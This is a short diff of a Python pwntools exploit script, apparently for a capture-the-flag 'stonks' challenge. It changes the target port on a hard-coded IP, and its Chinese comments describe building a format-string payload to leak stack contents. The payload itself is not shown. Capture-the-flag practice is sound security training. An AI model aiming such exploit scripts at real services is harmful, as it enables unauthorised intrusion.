@@ -2,7 +2,7 @@ from pwn import *
 import re
 
 def exploit():
-    r = remote('124.16.75.117', 51003)
+    r = remote('124.16.75.117', 51005)
     # 选择选项1 - Buy some stonks
     r.sendlineafter(b"What would you like to do?", b"1")
     # 构造格式化字符串payload来泄露更多栈内容
@@ -36,4 +36,3 @@ def exploit():
 
 if __name__ == "__main__":
     exploit()
-    
